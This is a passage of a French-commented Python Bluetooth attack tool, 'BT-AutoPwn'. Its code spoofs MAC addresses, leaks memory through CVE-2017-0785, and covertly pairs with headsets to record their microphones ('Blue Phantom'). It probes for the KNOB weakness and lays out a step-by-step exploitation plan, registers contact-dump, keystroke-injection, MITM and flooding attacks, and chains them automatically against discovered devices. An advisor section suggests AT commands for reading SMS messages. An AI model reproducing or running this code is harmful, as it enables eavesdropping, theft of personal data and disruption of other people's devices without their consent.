        pkt = struct.pack(">BHHH", 0x02, 0x0001, 0x0009, 0x0035)
        pkt += b"\x03\x19\x01\x00" + struct.pack(">HB", 0xFFFF, 0xFF) + b"\xFF" * 64
        sock.send(pkt)
        resp = sock.recv(1024); sock.close()
        SESSION.success(f"SDP réponse {len(resp)} bytes")
        result.append(f"Réponse SDP ({len(resp)} bytes): {resp[:32].hex()}")
        if len(resp) > 8:
            leaked = resp[8:]
            result.append(f"Données leakées (possible): {leaked[:48].hex()}")
    except OSError as e:
        result.append(f"SDP socket: {e}")
    return "\n".join(result)

# ── Stealth ────────────────────────────────────────────────────────────────────

def atk_mac_spoof(iface: str = None, fake: str = None) -> str:
    if not iface: iface = ADAPTERS.best("any") or "hci0"
    fake = fake or _rand_mac()
    SESSION.attack(f"MAC Spoof: {iface} → {fake}")
    run(f"hciconfig {iface} down")
    time.sleep(0.3)
    out, err, code = run(f"btmgmt -i {iface} public-addr {fake}")
    if code != 0: run(f"macchanger -m {fake} {iface} 2>/dev/null")
    run(f"hciconfig {iface} up"); time.sleep(0.3)
    real_mac = ADAPTERS._probe(iface).mac
    SESSION.success(f"MAC active: {real_mac}")
    return f"Demandé: {fake}\nActif: {real_mac}"

_alias_stop = threading.Event()

def atk_alias_loop(iface: str = None, duration: int = 60, names: list = None) -> str:
    if not iface: iface = ADAPTERS.best("any") or "hci0"
    _alias_stop.clear()
    names = names or FAKE_NAMES
    SESSION.attack(f"Broadcast Alias Loop [{iface}] {duration}s {len(names)} alias")
    count = 0
    end   = time.time() + duration
    while time.time() < end and not _alias_stop.is_set():
        n = names[count % len(names)]
        run(f"hciconfig {iface} name '{n}'"); run(f"hciconfig {iface} piscan")
        SESSION.info(f"  Alias: {n}"); count += 1; time.sleep(2)
    SESSION.success(f"Alias loop: {count} rotations")
    return f"Alias loop terminée — {count} rotations sur {duration}s"

# ── Blue Phantom — Audio Intercept ────────────────────────────────────────────

_rec_procs: dict = {}

def atk_audio_intercept(dev, duration: int = 30, **_) -> str:
    iface = get_iface("audio_intercept")
    SESSION.attack(f"Blue Phantom Audio Intercept → {dev.mac}")

    # 1. Vérifier la joignabilité
    SESSION.info(f"Ping L2 vers {dev.mac}...")
    out, _, code = run(f"l2ping -i {iface} -c 3 -t 3 {dev.mac} 2>&1", timeout=15)
    if code != 0 and "Host is not reachable" in out:
        return f"Appareil injoignable:\n{out}"

    # 2. Pair + Trust + Connect via bluetoothctl
    SESSION.info("Pairing automatique via bluetoothctl...")
    btctl_in = (f"power on\nagent on\ndefault-agent\npairable on\n"
                f"pair {dev.mac}\ntrust {dev.mac}\nconnect {dev.mac}\n")
    proc = subprocess.Popen("bluetoothctl", stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        stdout, _ = proc.communicate(input=btctl_in, timeout=25)
    except subprocess.TimeoutExpired:
        proc.kill(); stdout = ""
    SESSION.info(f"Bluetoothctl: {stdout[-200:].strip()}")

    # 3. Attendre activation profil audio (HFP/HSP)
    SESSION.info("Attente profil audio (3s)...")
    time.sleep(3)

    # 4. Trouver source PulseAudio
    pa_out, _, _ = run("pactl list sources short 2>/dev/null", timeout=5)
    SESSION.info(f"Sources PulseAudio:\n{pa_out}")
    sources = [l for l in pa_out.splitlines()
               if "bluez" in l.lower() and any(k in l.lower() for k in ("hfp","hsp","headset","a2dp","sink","source"))]
    if not sources:
        sources = [l for l in pa_out.splitlines() if "bluez" in l.lower()]
    if not sources:
        # Try pipewire
        pw_out, _, _ = run("pw-cli list-objects | grep -A5 bluez 2>/dev/null", timeout=5)
        return (f"Aucune source audio BT détectée.\n"
                f"Sources disponibles:\n{pa_out}\n"
                f"PipeWire:\n{pw_out}\n"
                f"Tip: connecter manuellement, activer profil HFP dans pavucontrol")

    src = sources[0].split()[1] if len(sources[0].split()) > 1 else sources[0].strip()
    SESSION.success(f"Source audio BT: {src}")

    # 5. Préparer enregistrement
    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    mac_safe = dev.mac.replace(":", "_")

    has_lame   = bool(shutil.which("lame"))
    has_ffmpeg = bool(shutil.which("ffmpeg"))

    if has_lame:
        out_file = f"{REC_DIR}/{mac_safe}_{ts}.mp3"
        rec_cmd  = f"parecord --device={src} --rate=44100 --channels=1 | lame -r -s 44.1 - {out_file}"
    elif has_ffmpeg:
        out_file = f"{REC_DIR}/{mac_safe}_{ts}.mp3"
        rec_cmd  = (f"parecord --device={src} | "
                    f"ffmpeg -f s16le -ar 44100 -ac 1 -i - {out_file} -y -loglevel quiet")
    else:
        out_file = f"{REC_DIR}/{mac_safe}_{ts}.wav"
        rec_cmd  = f"parecord --device={src} --file-format=wav {out_file}"

    # 6. Lancer enregistrement
    SESSION.attack(f"Enregistrement → {out_file}")
    rec_p = run_bg(rec_cmd)
    _rec_procs[dev.mac] = {"proc": rec_p, "file": out_file, "started": ts}

    return (f"[Blue Phantom] Enregistrement démarré\n"
            f"Source:  {src}\n"
            f"Fichier: {out_file}\n"
            f"PID:     {rec_p.pid}\n"
            f"Format:  {'MP3' if 'mp3' in out_file else 'WAV'}\n"
            f"Stop:    kill {rec_p.pid}  ou bouton STOP dans GUI")

def stop_audio_intercept(mac: str) -> str:
    if mac not in _rec_procs:
        return "Aucun enregistrement actif pour cet appareil"
    info = _rec_procs.pop(mac)
    info["proc"].terminate()
    SESSION.success(f"Enregistrement stoppé: {info['file']}")
    run(f"echo -e 'disconnect {mac}\\nuntrust {mac}\\nremove {mac}' | bluetoothctl 2>&1", timeout=10)
    SESSION.info(f"Cleanup: {mac} déconnecté et retiré")
    return f"Arrêté\nFichier: {info['file']}\nCleanup BT effectué"


def atk_knob(dev, **_):
    """CVE-2019-9506 — KNOB Attack: force l'entropie de la clé de chiffrement BT à 1 byte."""
    mac  = dev.mac
    iface = get_iface("knob")
    lines = [f"KNOB Attack (CVE-2019-9506) — {mac}", ""]

    SESSION.attack(f"KNOB ① collecte LMP → {mac}")
    out, _, rc = run(f"hcitool -i {iface} info {mac}", timeout=10)

    lmp_ver = "?"
    for line in out.splitlines():
        if "LMP Version" in line or "LMP Subversion" in line:
            lmp_ver = line.split(":")[-1].strip()
            break

    lines += [f"LMP Version  : {lmp_ver}",
              f"Interface    : {iface}", ""]

    # Version assessment — fix landed in BT 5.1 (LMP 0x0b)
    safe   = any(v in lmp_ver for v in ["0x0b","0x0c","0x0d","5.1","5.2","5.3","5.4"])
    vuln   = (not safe) and any(v in lmp_ver for v in
               ["0x04","0x05","0x06","0x07","0x08","0x09","0x0a",
                "1.0","1.1","1.2","2.0","2.1","3.0","4.0","4.1","4.2","5.0"])

    verdict = ("✓ PROBABLEMENT PATCHÉ — BT 5.1+ (patch CVE-2019-9506 inclus)" if safe else
               "⚠ POTENTIELLEMENT VULNÉRABLE — BT < 5.1 sans correctif" if vuln else
               "? Version indéterminée — test actif nécessaire")
    lines += [f"Verdict      : {verdict}", ""]

    SESSION.info(f"KNOB ② test connectivité L2CAP...")
    _, _, rc_ping = run(f"l2ping -i {iface} -c 2 -s 44 {mac}", timeout=10)
    if rc_ping != 0:
        lines += ["Connexion L2CAP : IMPOSSIBLE (hors portée / non discoverable)",
                  "→ Rapprocher l'appareil et relancer en mode visible"]
        return "\n".join(lines)

    lines.append("Connexion L2CAP : ✓ ÉTABLIE")
    SESSION.info("KNOB ③ tentative ACL + lecture entropie...")
    _, _, rc_cc = run(f"hcitool -i {iface} cc {mac}", timeout=8)

    if rc_cc == 0:
        # HCI_Read_Encryption_Key_Size OGF=0x05 OCF=0x0008
        enc_out, _, _ = run(f"hcitool -i {iface} cmd 0x14 0x0008", timeout=5)
        lines += ["Connexion ACL    : ✓ ÉTABLIE",
                  f"Réponse HCI Key  : {enc_out[:120] if enc_out else 'N/A'}", ""]
        run(f"hcitool -i {iface} dc {mac}", timeout=3)
        SESSION.success(f"KNOB: connexion ACL testée, entropie sondée sur {mac}")
    else:
        lines.append("Connexion ACL    : refusée (appareil non en mode couplage)")

    if vuln:
        lines += [
            "",
            "━━ SCÉNARIO D'EXPLOITATION ━━",
            "1. Se placer en MITM entre la cible et son périphérique couplé",
            "2. Intercepter LMP_encryption_key_size_req (btmon + Wireshark plugin BT)",
            "3. Modifier le champ key_size → 0x01 (1 byte = 256 combinaisons)",
            "4. Les deux appareils acceptent la clé réduite sans avertissement",
            "5. Brute-force session key : hashcat -m 23100 capture.hcitrace",
            "6. Déchiffrer tout le trafic BT passé et futur capturé",
            "",
            "   PoC référence : github.com/francozappa/knob",
            "   Patch         : mise à jour firmware BT 5.1+ / correctif constructeur",
        ]

    return "\n".join(lines)

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 9 — ATTACK REGISTRY
# ═══════════════════════════════════════════════════════════════════════════════

ATTACKS = {
    # ── RECON ──
    "sdp_enum":      {"cat":"Recon",   "name":"SDP Enumeration",        "desc":"Liste tous les services SDP exposés",           "fn":atk_sdp_enum,      "cap":"classic","sev":"LOW"},
    "rfcomm_scan":   {"cat":"Recon",   "name":"RFCOMM Scan",            "desc":"Scanne canaux RFCOMM ouverts (1-30)",           "fn":atk_rfcomm_scan,   "cap":"classic","sev":"MEDIUM"},
    "bettercap_ble": {"cat":"Recon",   "name":"Bettercap BLE Bridge",   "desc":"Recon BLE étendu via bettercap",               "fn":atk_bettercap_ble, "cap":"ble",    "sev":"LOW"},
    # ── EXPLOIT ──
    "gatt_write":    {"cat":"Exploit", "name":"GATT Write",             "desc":"Écriture GATT non authentifiée",                "fn":atk_gatt_write,    "cap":"ble",    "sev":"HIGH"},
    "rfcomm_connect":{"cat":"Exploit", "name":"RFCOMM Connect",         "desc":"Connexion RFCOMM non-auth",                    "fn":atk_rfcomm_connect,"cap":"classic","sev":"HIGH"},
    "ble_mitm":      {"cat":"Exploit", "name":"BLE MITM",               "desc":"Proxy MITM BLE (2 adaptateurs)",               "fn":atk_ble_mitm,      "cap":"ble",    "sev":"HIGH"},
    "notif_replay":  {"cat":"Exploit", "name":"Notification Replay",    "desc":"Capture + rejoue notifications GATT",          "fn":atk_notif_replay,  "cap":"ble",    "sev":"HIGH"},
    "pbap_dump":     {"cat":"Exploit", "name":"PBAP Dump",              "desc":"Extraction carnet d'adresses",                 "fn":atk_pbap_dump,     "cap":"classic","sev":"HIGH"},
    "obex_push":     {"cat":"Exploit", "name":"OBEX File Push",         "desc":"Envoi fichier via OPP",                        "fn":atk_obex_push,     "cap":"classic","sev":"MEDIUM"},
    "bluejack":      {"cat":"Exploit", "name":"Bluejacking",            "desc":"OBEX push non sollicité",                      "fn":atk_bluejack,      "cap":"classic","sev":"MEDIUM"},
    "hid_inject":    {"cat":"Exploit", "name":"HID Injection",          "desc":"Injection de frappes clavier HID",             "fn":atk_hid_inject,    "cap":"classic","sev":"HIGH"},
    # ── AUDIO (Blue Phantom) ──
    "audio_intercept":{"cat":"Audio",  "name":"Audio Intercept",        "desc":"Intercept micro/casque HFP/HSP (Blue Phantom)","fn":atk_audio_intercept,"cap":"classic","sev":"CRITICAL"},
    # ── DoS ──
    "ble_deauth":    {"cat":"DoS",     "name":"BLE Deauth",             "desc":"Déconnexion forcée L2CAP + HCI",               "fn":atk_ble_deauth,    "cap":"ble",    "sev":"MEDIUM"},
    "ble_crasher":   {"cat":"DoS",     "name":"BLE Device Crasher",     "desc":"L2ping oversized + GATT junk flood",           "fn":atk_ble_crasher,   "cap":"ble",    "sev":"HIGH"},
    "zerojam":       {"cat":"DoS",     "name":"ZeroJam Mesh Flood",     "desc":"Flood BLE advertisements ciblé",               "fn":atk_zerojam,       "cap":"ble",    "sev":"HIGH"},
    # ── CVE ──
    "blueborne":     {"cat":"CVE",     "name":"BlueBorne Check",        "desc":"Détection CVE-2017-1000251/1000250",           "fn":atk_blueborne,     "cap":"classic","sev":"CRITICAL"},
    "cve_2017_0785": {"cat":"CVE",     "name":"CVE-2017-0785",          "desc":"BlueBorne SDP info disclosure",                "fn":atk_cve_2017_0785, "cap":"classic","sev":"HIGH"},
    "knob":          {"cat":"CVE",     "name":"KNOB Attack",            "desc":"CVE-2019-9506 — entropie chiffrement BT",      "fn":atk_knob,          "cap":"classic","sev":"CRITICAL"},
}

SEV_COLOR = {"CRITICAL":"#ff2244","HIGH":"#ff8800","MEDIUM":"#ffcc00","LOW":"#44aaff"}
CAT_COLOR = {
    "Recon":"#00ccff","Exploit":"#ffcc00","Audio":"#cc44ff",
    "DoS":"#ff4444","CVE":"#ff8800","Stealth":"#44ff99",
}

def run_attack(aid: str, dev: BTDevice, **kwargs) -> str:
    a = ATTACKS[aid]
    SESSION.attack(f"▶ {a['name']} → {dev.mac if dev else 'standalone'}")
    ADAPTERS.mark(get_iface(aid), True)
    try:
        result = a["fn"](dev, **kwargs)
    except Exception as e:
        result = f"Erreur: {e}"
        SESSION.error(f"{a['name']} exception: {e}")
    finally:
        ADAPTERS.mark(get_iface(aid), False)
    SESSION.success(f"✓ {a['name']} terminé")
    return result

def export_session(devices: list, results: dict) -> dict:
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = os.path.join(LOG_DIR, f"session_{ts}")
    SESSION.export_json(base+".json", devices, results)
    SESSION.export_txt (base+".txt")
    SESSION.export_csv (base+".csv")
    SESSION.success(f"Session exportée: {base}.[json|txt|csv]")
    return {"json":base+".json","txt":base+".txt","csv":base+".csv"}


def auto_chain(dev: BTDevice,
               progress_cb=None,
               stop_evt: threading.Event = None) -> dict:
    """
    Exécute automatiquement la séquence d'attaque optimale sur un appareil.
    progress_cb(step_label: str, detail: str) — appelé à chaque étape.
    Retourne dict {aid: result}.
    """
    if stop_evt is None:
        stop_evt = threading.Event()
    results: dict[str, str] = {}

    def log(msg):
        SESSION.info(f"[AUTO] {msg}")
        if progress_cb: progress_cb(msg, "")

    def run_step(aid: str, label: str, **kw):
        if stop_evt.is_set():
            return None
        if progress_cb: progress_cb(f"▶ {label}", "en cours...")
        SESSION.attack(f"[AUTO] ▶ {label}")
        result = run_attack(aid, dev, **kw)
        results[aid] = result
        if aid in EXPLANATIONS:
            ex = EXPLANATIONS[aid]
            SESSION.info(f"[AUTO·EXPLICATION] {ex['quoi']}")
        for tip in ADVISOR.after_attack(aid, result):
            SESSION.info(f"[AUTO·CONSEIL] {tip}")
        if progress_cb: progress_cb(f"✓ {label}", result[:120])
        return result

    # ─── Phase 1 : Recon ────────────────────────────────────────────────────
    log(f"═══ Phase 1 : Reconnaissance — {dev.name} ({dev.mac}) ═══")
    log(f"Type: {dev.dev_type}  |  RSSI: {dev.rssi}dBm  |  Fabricant: {dev.manufacturer or '?'}")

    if dev.dev_type in ("Classic","Dual","DUAL"):
        log("① Énumération SDP — cartographie des services exposés")
        run_step("sdp_enum", "SDP Enumeration")

    if dev.dev_type in ("BLE","Dual","DUAL"):
        log("① Bettercap BLE Bridge — recon étendu BLE")
        run_step("bettercap_ble", "Bettercap BLE Bridge")

    # ─── Phase 2 : Deep enum ────────────────────────────────────────────────
    log("═══ Phase 2 : Énumération approfondie ═══")
    full_enum(dev)
    protos = classify_services(dev.services + [str(c) for c in dev.characteristics])
    log(f"Protocoles détectés : {', '.join(protos) if protos else 'aucun (hors portée ou restrictions)'}")

    score = risk_score(dev)
    log(f"Score de risque calculé : {score}/100")

    if stop_evt.is_set():
        return results

    # ─── Phase 3 : Priorités CRITICAL ───────────────────────────────────────
    log("═══ Phase 3 : Exploitation — cibles prioritaires ═══")

    if "HFP" in protos or "HSP" in protos:
        log("★ HFP/HSP détecté → PRIORITÉ ABSOLUE : Audio Intercept (micro)")
        run_step("audio_intercept", "Audio Intercept (HFP/HSP)")

    if not stop_evt.is_set() and "HID" in protos:
        log("★ HID détecté → PRIORITÉ : HID Injection (contrôle clavier)")
        run_step("hid_inject", "HID Injection")

    if not stop_evt.is_set() and "PBAP" in protos:
        log("★ PBAP détecté → PRIORITÉ : PBAP Dump (répertoire téléphonique)")
        run_step("pbap_dump", "PBAP Dump")

    # ─── Phase 4 : Exploitation secondaire ──────────────────────────────────
    if not stop_evt.is_set() and dev.dev_type in ("Classic","Dual","DUAL"):
        if "RFCOMM" in protos:
            log("② RFCOMM exposé — scan des 30 canaux")
            run_step("rfcomm_scan", "RFCOMM Scan")
            if "ouvert" in results.get("rfcomm_scan","").lower():
                log("  → Canal ouvert trouvé — connexion et test AT")
                run_step("rfcomm_connect", "RFCOMM Connect")

        if "OPP" in protos:
            log("② OPP disponible — test bluejacking")
            run_step("bluejack", "Bluejacking")

    if not stop_evt.is_set() and dev.dev_type in ("BLE","Dual","DUAL"):
        if "GATT" in protos:
            log("② GATT présent — écriture non authentifiée")
            run_step("gatt_write", "GATT Write")
            if any(kw in results.get("gatt_write","").lower() for kw in ["ecrit","✓","success"]):
                log("  → GATT accessible — test replay de notifications")
                run_step("notif_replay", "Notification Replay")

        log("② BLE Deauth → précurseur MITM")
        run_step("ble_deauth", "BLE Deauth")

    # ─── Phase 5 : CVE & firmware ───────────────────────────────────────────
    if not stop_evt.is_set() and dev.dev_type in ("Classic","Dual","DUAL"):
        log("═══ Phase 4 : Vérifications CVE ═══")
        run_step("blueborne", "BlueBorne Check (CVE-2017-1000251)")
        if any(kw in results.get("blueborne","").lower() for kw in ["vulnérable","oui"]):
            log("  ⚠ BlueBorne confirmé → CVE-2017-0785 info leak (bypass ASLR)")
            run_step("cve_2017_0785", "CVE-2017-0785 SDP Leak")

        log("② KNOB Attack (CVE-2019-9506) — test entropie chiffrement")
        run_step("knob", "KNOB Attack (CVE-2019-9506)")

    # ─── Phase 6 : Résumé ───────────────────────────────────────────────────
    log("═══ Résumé Auto Chain ═══")
    ok = sum(1 for r in results.values() if r and "erreur" not in r.lower())
    log(f"Terminé : {len(results)} attaques exécutées, {ok} résultats positifs")
    for aid, res in results.items():
        name = ATTACKS.get(aid,{}).get("name", aid)
        log(f"  {name}: {res[:80].strip()}{'…' if len(res)>80 else ''}")

    return results


def risk_score(dev: BTDevice) -> int:
    """Calcule un score de risque 0-100 basé sur RSSI, firmware, services et vulnérabilités."""
    score = 0

    # Proximité / RSSI (0-10)
    if dev.rssi is not None:
        score += 10 if dev.rssi >= -50 else 7 if dev.rssi >= -65 else 4 if dev.rssi >= -80 else 1

    # Firmware ancien (0-10)
    old_lmp = ["0x04","0x05","0x06","0x07","0x08","0x09","0x0a",
               "3.0","4.0","4.1","4.2","5.0"]
    if dev.lmp_version and any(v in dev.lmp_version for v in old_lmp):
        score += 10

    # Services à haute valeur (plafonné à 45)
    protos = classify_services(dev.services + [str(c) for c in dev.characteristics])
    svc_pts = {"HFP":12,"HID":12,"BNEP":10,"PAN":10,"RFCOMM":8,
               "PBAP":8,"A2DP":6,"HSP":6,"GATT":5,"OPP":4,"SDP":3}
    score += min(sum(pts for p,pts in svc_pts.items() if p in protos), 45)

    # Vulnérabilités par sévérité (plafonné à 35)
    sev_pts = {"CRITICAL":15,"HIGH":10,"MEDIUM":5,"LOW":2}
    vul_total = 0
    for proto in protos:
        if proto in VULN_DB:
            vul_total += sev_pts.get(VULN_DB[proto]["severity"], 0)
    score += min(vul_total, 35)

    return min(score, 100)


def risk_color(score: int) -> str:
    if score >= 75: return "#ff2244"
    if score >= 50: return "#ff8800"
    if score >= 25: return "#ffcc00"
    return "#44aaff"


def generate_html_report(devices: list, results: dict) -> str:
    ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    sev_color = {"CRITICAL":"#ff2244","HIGH":"#ff8800","MEDIUM":"#ffcc00","LOW":"#44aaff"}
    total_vulns = sum(len(d.vulnerabilities) for d in devices)
    total_atks  = sum(len(v) for v in results.values())
    n_crit      = sum(1 for d in devices if risk_score(d) >= 75)

    html = f"""<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"><title>BT-AutoPwn — Rapport {ts}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#0b0b0f;color:#ccccdd;font-family:'Courier New',monospace}}
.hdr{{background:#13131f;border-bottom:2px solid #39ff14;padding:22px 32px}}
.hdr h1{{color:#39ff14;font-size:1.5em}} .hdr small{{color:#555566;font-size:.8em}}
.stats{{display:flex;gap:16px;padding:18px 32px;background:#0f0f18;border-bottom:1px solid #1e1e2a;flex-wrap:wrap}}
.stat{{background:#13131f;border:1px solid #1e1e2a;border-radius:6px;padding:12px 20px;min-width:120px}}
.stat .n{{font-size:2em;font-weight:bold;color:#39ff14}}.stat .l{{font-size:.8em;color:#555566;margin-top:4px}}
.sec{{padding:22px 32px}}.sec h2{{color:#00e5ff;border-bottom:1px solid #1e1e2a;padding-bottom:8px;margin-bottom:14px}}
.card{{background:#13131f;border:1px solid #1e1e2a;border-radius:8px;margin-bottom:18px;overflow:hidden}}
.card-hdr{{background:#1a1a2a;padding:10px 18px;display:flex;align-items:center;gap:14px;border-bottom:1px solid #1e1e2a}}
.mac{{color:#39ff14;font-weight:bold;font-size:1.05em}}.devname{{color:#ccccdd}}
.badge{{border-radius:4px;padding:3px 10px;font-weight:bold;font-size:.82em;margin-left:auto}}
.body{{display:grid;grid-template-columns:1fr 1fr;gap:0}}
.col{{padding:14px 18px}}.col:first-child{{border-right:1px solid #1e1e2a}}
.f{{margin-bottom:7px;font-size:.86em}}.k{{color:#555566;display:inline-block;width:90px}}.v{{color:#ccccdd}}
.tag{{display:inline-block;background:#1a1a2a;border:1px solid #2a2a3a;border-radius:3px;padding:1px 7px;margin:2px;font-size:.78em}}
.vi{{background:#1a0808;border-left:3px solid #ff2244;padding:5px 10px;margin-bottom:3px;font-size:.8em;border-radius:0 3px 3px 0}}
.atk-sec{{padding:0 18px 14px}}.atk-lbl{{color:#00e5ff;font-size:.82em;font-weight:bold;margin:10px 0 4px;border-top:1px solid #1e1e2a;padding-top:8px}}
.atk-res{{background:#090910;border:1px solid #1e1e2e;border-radius:4px;padding:9px 12px;font-size:.78em;color:#8899aa;white-space:pre-wrap;max-height:180px;overflow-y:auto;margin-bottom:6px}}
.logbox{{background:#06060e;border:1px solid #1e1e2a;border-radius:6px;padding:14px;font-size:.78em;max-height:350px;overflow-y:auto}}
.ts{{color:#222233}}.INFO{{color:#8899aa}}.WARN{{color:#ffcc00}}.SUCCESS{{color:#39ff14}}.ERROR{{color:#ff2244}}.ATTACK{{color:#ff8800}}
.ftr{{text-align:center;padding:20px;color:#333344;font-size:.78em;border-top:1px solid #1e1e2a}}
</style></head><body>
<div class="hdr"><h1>◈ BT-AutoPwn v{VERSION} — Rapport de Sécurité Bluetooth</h1>
<small>Généré le {ts} · Session de test personnel · {len(devices)} appareil(s)</small></div>
<div class="stats">
<div class="stat"><div class="n">{len(devices)}</div><div class="l">Appareils</div></div>
<div class="stat"><div class="n">{total_vulns}</div><div class="l">Vulnérabilités</div></div>
<div class="stat"><div class="n">{total_atks}</div><div class="l">Attaques</div></div>
<div class="stat" style="border-color:#ff2244"><div class="n" style="color:#ff2244">{n_crit}</div><div class="l">Risque ≥75</div></div>
<div class="stat"><div class="n">{len(SESSION.entries)}</div><div class="l">Événements log</div></div>
</div>
<div class="sec"><h2>APPAREILS ANALYSÉS</h2>
"""
    for dev in devices:
        sc   = risk_score(dev)
        col  = risk_color(sc)
        pr   = classify_services(dev.services + [str(c) for c in dev.characteristics])
        dr   = results.get(dev.mac, {})
        html += f"""<div class="card">
<div class="card-hdr"><div><div class="mac">{dev.mac}</div><div class="devname">{dev.name}</div></div>
<div class="badge" style="background:{col}22;color:{col};border:1px solid {col}55">RISQUE {sc}/100</div></div>
<div class="body"><div class="col">
<div class="f"><span class="k">Type</span><span class="v">{dev.dev_type}</span></div>
<div class="f"><span class="k">Fabricant</span><span class="v">{dev.manufacturer or "?"}</span></div>
<div class="f"><span class="k">RSSI</span><span class="v">{f"{dev.rssi:+d} dBm" if dev.rssi else "N/A"}</span></div>
<div class="f"><span class="k">LMP</span><span class="v">{dev.lmp_version or "?"}</span></div>
<div class="f"><span class="k">Protocoles</span><span class="v">"""
        for p in pr:
            c2 = sev_color.get(VULN_DB.get(p,{}).get("severity",""),"#777788")
            html += f'<span class="tag" style="color:{c2}">{p}</span>'
        html += f"""</span></div>
</div><div class="col">"""
        if dev.vulnerabilities:
            for v in dev.vulnerabilities[:8]:
                html += f'<div class="vi">{v}</div>'
        else:
            html += '<span style="color:#333344;font-size:.85em">Aucune vuln — énumération non effectuée</span>'
        html += "</div></div>"
        if dr:
            html += '<div class="atk-sec">'
            for aid, res in dr.items():
                n = ATTACKS.get(aid,{}).get("name",aid)
                html += f'<div class="atk-lbl">▶ {n}</div><div class="atk-res">{res[:600]}</div>'
            html += "</div>"
        html += "</div>\n"

    html += f"""</div><div class="sec"><h2>JOURNAL DE SESSION (100 dernières entrées)</h2>
<div class="logbox">"""
    for e in SESSION.entries[-100:]:
        html += f'<div><span class="ts">[{e.ts}]</span> <span class="{e.level}">{e.msg}</span></div>'
    html += f"""</div></div>
<div class="ftr">BT-AutoPwn v{VERSION} · {ts} · Usage personnel uniquement</div>
</body></html>"""
    return html


def export_html_report(devices: list, results: dict) -> str:
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOG_DIR, f"rapport_{ts}.html")
    with open(path, "w", encoding="utf-8") as f:
        f.write(generate_html_report(devices, results))
    SESSION.success(f"Rapport HTML exporté : {path}")
    return path

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 9.5 — EXPLICATIONS & CONSEILS (ADVISOR)
# ═══════════════════════════════════════════════════════════════════════════════

EXPLANATIONS: dict[str, dict] = {
    "sdp_enum": {
        "titre":         "Énumération SDP (Service Discovery Protocol)",
        "quoi":          "Interroge la base de données de services BT Classic de la cible pour lister tous les profils actifs (audio, série, réseau, HID…).",
        "comment":       "SDP fonctionne sur le canal L2CAP PSM 1. On envoie une requête 'Browse All' et la cible répond avec ses services : UUID, canaux RFCOMM, versions de protocole.",
        "chercher":      "Ports RFCOMM ouverts, profils HFP/HSP (audio), HID (clavier), PBAP (contacts), OBEX — chaque service = vecteur d'attaque potentiel.",
        "conseil_avant": "Toujours commencer par cette étape sur un appareil Classic. Elle guide toute la stratégie d'attaque.",
        "conseil_apres": "HFP/HSP détecté → Audio Intercept. PBAP → PBAP Dump. RFCOMM → RFCOMM Scan. HID → HID Injection.",
    },
    "rfcomm_scan": {
        "titre":         "Scan de canaux RFCOMM",
        "quoi":          "Tente des connexions sur les 30 canaux RFCOMM pour identifier lesquels acceptent des connexions sans authentification.",
        "comment":       "RFCOMM émule une liaison série RS-232 sur Bluetooth. Certains canaux sont ouverts sans auth, permettant l'envoi de commandes AT ou de données brutes directement.",
        "chercher":      "Canaux sans 'Connection refused'. Canal 1 = SPP (port série). Canal 17 = PBAP. Canal 3 = souvent HFP.",
        "conseil_avant": "Signal minimum recommandé : -70 dBm. En dessous, les connexions RFCOMM sont instables.",
        "conseil_apres": "Sur chaque canal ouvert : tenter RFCOMM Connect puis envoyer 'AT\\r\\n'. Réponse 'OK' = appareil AT-commandable (téléphone, modem).",
    },
    "bettercap_ble": {
        "titre":         "Bettercap BLE Recon Bridge",
        "quoi":          "Lance bettercap en mode BLE passif pour une découverte avancée incluant les données fabricant, UUID propriétaires et TX Power.",
        "comment":       "Bettercap décode les paquets BLE advertisement complets, révélant des informations que hcitool ne montre pas : Company ID, UUIDs custom, intervalles d'advertising.",
        "chercher":      "UUIDs hors plage 0x1800-0x1FFF = protocoles propriétaires. Company ID = fabricant exact. TX Power permet de calculer la distance précise.",
        "conseil_avant": "Utiliser en complément du scan initial pour les appareils qui apparaissent avec peu d'informations ou un nom 'Unknown'.",
        "conseil_apres": "Les UUIDs custom révèlent souvent des protocoles non documentés — les chercher dans les SDK du fabricant ou dans les fichiers APK associés.",
    },
    "gatt_write": {
        "titre":         "Écriture GATT non authentifiée",
        "quoi":          "Tente d'écrire des données sur les characteristics GATT BLE sans s'authentifier, pour identifier les points d'accès non protégés.",
        "comment":       "Le profil GATT organise les données BLE en Services > Characteristics. Beaucoup d'appareils IoT bon marché n'imposent ni chiffrement ni authentification pour certaines characteristics.",
        "chercher":      "Réponse 'successfully' = characteristic accessible sans auth. Identifier l'UUID (ex: 0x2A37 = rythme cardiaque) pour comprendre la fonction contrôlée.",
        "conseil_avant": "Énumérer d'abord les characteristics (bouton 'Énumérer appareil'). Sans handles, l'attaque tente des adresses génériques — moins précis.",
        "conseil_apres": "Sur les handles accessibles, tester des valeurs métier : 01 (activer), 00 (désactiver), FF (max). Observer les changements physiques sur l'appareil.",
    },
    "rfcomm_connect": {
        "titre":         "Connexion RFCOMM directe",
        "quoi":          "Établit une connexion série brute sur le canal RFCOMM 1 pour interagir directement avec les services de l'appareil.",
        "comment":       "Une fois connecté, le canal RFCOMM se comporte comme un port série /dev/rfcomm0. Les téléphones/modems répondent au jeu de commandes AT. Les appareils IoT transmettent souvent des données propriétaires.",
        "chercher":      "Connexion établie = canal ouvert. Envoyer 'AT\\r\\n' — réponse 'OK' = appareil AT-commandable. 'ERROR' = protocole différent.",
        "conseil_avant": "Lancer RFCOMM Scan d'abord pour identifier les canaux réellement ouverts. Canal 1 est une tentative générique.",
        "conseil_apres": "Sur connexion AT : essayer 'AT+CLAC\\r\\n' (liste commandes), 'ATI\\r\\n' (info appareil), 'AT+CMGL=\\\"ALL\\\"\\r\\n' (liste SMS).",
    },
    "ble_mitm": {
        "titre":         "MITM BLE — Proxy Man-in-the-Middle",
        "quoi":          "Place l'outil entre l'appareil BLE et son contrôleur légitime pour intercepter et modifier les communications dans les deux sens en temps réel.",
        "comment":       "hci1 se connecte à la cible BLE en se faisant passer pour le contrôleur. hci0 crée un faux appareil qui ressemble à la cible. Tout le trafic transite par notre proxy.",
        "chercher":      "Credentials, tokens, valeurs de configuration, données de santé — tout ce qui transite non chiffré ou avec un chiffrement faible.",
